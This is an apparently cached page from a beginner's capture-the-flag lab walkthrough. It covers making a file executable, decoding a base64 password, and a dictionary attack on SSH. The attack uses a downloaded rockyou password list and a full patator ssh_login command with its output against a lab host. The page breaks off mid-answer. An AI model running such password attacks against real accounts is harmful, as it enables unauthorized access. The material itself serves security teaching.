@@ -1,0 +1,195 @@
+I"�+<p><br /></p>
+<h1 id="level-35---this-ones-not-about-brute-force">Level 35 - This One’s Not About Brute Force!</h1>
+<p>Ok, so the rest of these levels will involve brute forcing, but this one doesn’t. I just didn’t want to have a whole separate page for this one. \(o_O)/
+<br />Sekhmet, in all her anger about Mafdet, also found some other account info!</p>
+
+<details>
+<summary>Level 35 - Hint</summary>
+
+<br />
+<span style="color:DodgerBlue">
+Find out how to make a file executable in Linux.
+</span>
+</details>
+<p><br /></p>
+<details>
+<summary>Level 35 - Full Answer</summary>
+
+<br />
+<span style="color:MediumSeaGreen">
+Linux doesn't let you run/execute a program unless the file specifically has the permissions set up to do so. Check the permissions with <code>ls -la</code>:
+<pre>
+sekhmet@thehaxthatrocksthecradle:~$ ls -la runthisthing 
+-rw-rw-r-- 1 sekhmet sekhmet 16744 Apr  2  2021 runthisthing
+</pre>
+<br />
+The file permissions are all those letters/symbols at the beginning of the second line, to the left of the number 1. But how do you read all that mess? To fully understand it would require a long explanation, so let's just go with the basics for now and explain it all with some handy color-coding.<br />
+<br />
+<code>
+<span style="color:purple">-</span>
+<span style="color:DarkOrange">rw-</span>
+<span style="color:DarkSlateBlue">rw-</span>
+<span style="color:DeepPink">r--</span>
+ 1 
+ <span style="color:DarkOrange">sekhmet </span>
+<span style="color:DarkSlateBlue"> sekhmet </span>
+ 16744 Apr  2  2021 runthisthing</code><br />
+<br />
+<span style="color:purple"><code>-</code> - This will typically just be a <code>-</code> if it's a file or a letter <code>d</code> if it's a directory. Ours is a file, we don't need anything else from it here.</span><br />
+<span style="color:DarkOrange"><code>rw-</code> - This indicates that the owner of the file can read it and write to it. A letter means the permission is present, a dash means that permission is not present. The owner in this case is our buddy Sekhmet (the first <code>sekhmet</code> is the owner)</span> <br />
+<span style="color:DarkSlateBlue"><code>rw-</code> - Same thing here, but this is for the owning group. The second <code>sekhmet</code> is the owning group. We can see that the sekhmet group can also read and write to the file</span><br />
+<span style="color:DeepPink"><code>r--</code> - These are the permissions for everyone else. Everyone can read the file, but they can't write to it.</span><br />
+<br />
+So now what? Well, we want to add <b>execution</b> permissions to the file, which would be represented by an <code>x</code> instead of the <code>-</code> in the third column for each permission set. The easiest way to do that would be:<br />
+<code>chmod +x runthisthing</code><br />
+<br />
+This adds the <code>x</code> to all the permissions for this file. Note that this means everyone can execute this file now! You can get more granular, but we're just going for quick and easy right now.<br />
+<br />
+Check the permissions after running that and they should be:<br />
+<pre>
+sekhmet@thehaxthatrocksthecradle:~$ ls -la runthisthing 
+-rwxrwxr-x 1 sekhmet sekhmet 16744 Apr  2  2021 runthisthing
+</pre>
+<br />
+Ok, so now you can allegedly execute this file. Right. Let's do that now.<br />
+How?<br />
+<br />
+To run an executable file in the directory you're currently in at the CLI:<br />
+<pre>./runthisthing
+                                                 &gt;=&gt;                    
+                                                 &gt;=&gt;                    
+  &gt;==&gt;    &gt;=&gt;   &gt;=&gt;   &gt;==&gt;       &gt;==&gt; &gt;=&gt;  &gt;=&gt; &gt;=&gt;&gt;==&gt; &gt;=&gt;  &gt;=&gt;  &gt;===&gt;  
+&gt;&gt;   &gt;=&gt;    &gt;&gt; &gt;=&gt;  &gt;&gt;   &gt;=&gt;   &gt;=&gt;    &gt;=&gt;  &gt;=&gt;   &gt;=&gt;   &gt;=&gt;  &gt;=&gt; &gt;=&gt;     
+&gt;&gt;===&gt;&gt;=&gt;    &gt;&gt;     &gt;&gt;===&gt;&gt;=&gt; &gt;=&gt;     &gt;=&gt;  &gt;=&gt;   &gt;=&gt;   &gt;=&gt;  &gt;=&gt;   &gt;==&gt;  
+&gt;&gt;         &gt;&gt;  &gt;=&gt;  &gt;&gt;         &gt;=&gt;    &gt;=&gt;  &gt;=&gt;   &gt;=&gt;   &gt;=&gt;  &gt;=&gt;     &gt;=&gt; 
+ &gt;====&gt;   &gt;=&gt;   &gt;=&gt;  &gt;====&gt;      &gt;==&gt;   &gt;==&gt;=&gt;    &gt;=&gt;    &gt;==&gt;=&gt; &gt;=&gt; &gt;=&gt; 
+                                         
+You have executed the program as required
+Decode for the password:
+ZXhlY3V0aXZlT3JkZXJz
+</pre><br />
+These people and their encoding!! (╯°□°）╯︵ ┻━┻)<br />
+Decode as usual from base64:<br />
+<pre>
+└─$ hURL -b ZXhlY3V0aXZlT3JkZXJz           
+
+Original string       :: ZXhlY3V0aXZlT3JkZXJz
+base64 DEcoded string :: executiveOrders
+</pre>
+
+<i>There's a lot more to permissions that I didn't cover - you can certainly find more info online, such as here: <a href="https://linuxhandbook.com/linux-file-permissions/">https://linuxhandbook.com/linux-file-permissions/</a></i>
+</span>
+</details>
+<p><br /></p>
+<h1 id="level-36---this-one-is-about-brute-force">Level 36 - This One is About Brute Force!</h1>
+<p>Let’s get into some password attacks!
+A short/quick definition of brute forcing an account would be going through a bunch of guesses for the password for the account. There are a few different types.</p>
+
+<p>A true brute force, or key space brute force is the most … brutish of them all. For example - we did just that in the earlier examples. Our key space was just 26 letters at first (26 guesses), then 2 digit numbers (100 guesses), then 4 digit numbers. That last one took us up to 10,000 possible guesses (0000-9999). What if we add lowercase letters to that mix?
+We’d be up to 1,679,616 guesses. You can see how this starts to get impractical pretty quickly. Enter the dictionary attack!</p>
+
+<p>A dictionary attack uses a list of likely passwords. Where does that list come from? Could be any of a variety of places:</p>
+<ul>
+  <li>a breach of a company’s database</li>
+  <li>a compilation of words from a website the victim frequents</li>
+  <li>a list of commonly used passwords</li>
+  <li>a list you sat there typing up by hand because … you were working on your typing skills, maybe?</li>
+</ul>
+
+<p>This type of attack relies on someone using something in your list as their password, so the art of getting a list together is another subject that could make for a book by itself. We will instead take advantage of someone else’s work and use a pre-existing list.</p>
+
+<details>
+<summary>Level 36 - Hint</summary>
+
+<br />
+<span style="color:DodgerBlue">
+Your steps for this level:
+<ul>
+<li>Download the password list</li>
+<li>Find a way to perform a brute force password attack against SSH - hint for the hint, look up how to do it with Patator. Hint for that - honestly, just check out patator's awesome help menu from the command line!</li>
+<li>Perform the SSH password attack</li>
+</ul>
+</span>
+</details>
+<p><br /></p>
+<details>
+<summary>Level 36 - Full Answer</summary>
+
+<br />
+<span style="color:MediumSeaGreen">
+Your steps for this level:
+<ul>
+<li>Download the password list</li>
+<ul>
+<li><code>wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-15.txt</code><br />
+This is a cut down version of a very well known password list. This GitHub repository has a ton of lists for trying to discover/crack all sorts of stuff including usernames, passwords, directories, and more!</li>
+</ul>
+<li>Find a way to perform a password attack against SSH</li>
+<ul>
+<li>I'll be using Patator in this case, but there are other applications you could use instead.</li>
+<li>If you checked out the tool's help (like I said you should!!) you might have seen something like:
+<pre>
+└─$ patator --help          
+Patator 0.9 (https://github.com/lanjelot/patator) with python-3.10.7
+Usage: patator module --help
+
+Available modules:
+  + ftp_login     : Brute-force FTP
+  + ssh_login     : Brute-force SSH
+  + telnet_login  : Brute-force Telnet
+... etc
+</pre>
+Then check out the module specific help:
+<pre>
+└─$ patator ssh_login --help
+Patator 0.9 (https://github.com/lanjelot/patator) with python-3.10.7
+Usage: ssh_login &lt;module-options ...&gt; [global-options ...]
+
+Examples:
+  ssh_login host=10.0.0.1 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'
+
+Module options:
+  host          : target host
+  port          : target port [22]
+  user          : usernames to test
+  password      : passwords to test
+  auth_type     : type of password authentication to use [password|keyboard-interactive|auto]
+  keyfile       : file with RSA, DSA or ECDSA private key to test
+  persistent    : use persistent connections [1|0] 
+</pre>
+From the example given and the option descriptions, we can start filling in our environment's info as seen in the next step.
+</li>
+</ul>
+<li>Perform the SSH password attack</li>
+<ul>
+<li><pre>
+└─$ patator ssh_login host=10.0.0.19 user=brutus password=FILE0 0=rockyou-15.txt
+21:14:26 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.10.7 at 2022-09-29 21:14 CDT
+21:14:26 patator    INFO -                                                                              
+21:14:26 patator    INFO - code  size    time | candidate                          |   num | mesg
+21:14:26 patator    INFO - -----------------------------------------------------------------------------
+21:14:29 patator    INFO - 1     22     3.506 | 123456                             |     1 | Authentication failed.
+21:14:29 patator    INFO - 1     22     3.497 | 12345                              |     2 | Authentication failed.
+21:14:29 patator    INFO - 1     22     3.506 | 123456789                          |     3 | Authentication failed.
+21:14:29 patator    INFO - 1     22     3.502 | iloveyou                           |     5 | Authentication failed.
+21:14:30 patator    INFO - 1     22     3.524 | password                           |     4 | Authentication failed.
+21:14:30 patator    INFO - 1     22     3.508 | princess                           |     6 | Authentication failed.
+21:14:30 patator    INFO - 1     22     3.501 | 1234567                            |     7 | Authentication failed.
+21:14:30 patator    INFO - 1     22     3.505 | 12345678                           |     8 | Authentication failed.
+21:14:30 patator    INFO - 1     22     3.501 | abc123                             |     9 | Authentication failed.
+21:14:30 patator    INFO - 1     22     3.501 | nicole                             |    10 | Authentication failed.
+21:14:33 patator    INFO - 1     22     3.496 | daniel                             |    11 | Authentication failed.
+</pre>
+</li>
+<li>I left off the <code>-x ignore:mesg="Authentication failed."</code> in this example just so you could see the process as it tries guessing all the different passwords. You can add that to the end of the command to make the output cleaner. Note that it will look like it's not doing anything for a while if you do that.</li>
+<li>...or leave it as is and just scroll through the output a bit to find ...<br />
+<pre>
+&lt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/ul&gt;
+&lt;/span&gt;
+&lt;/details&gt;
+<br />
+</pre></li></ul></ul></span></details>
+:ET
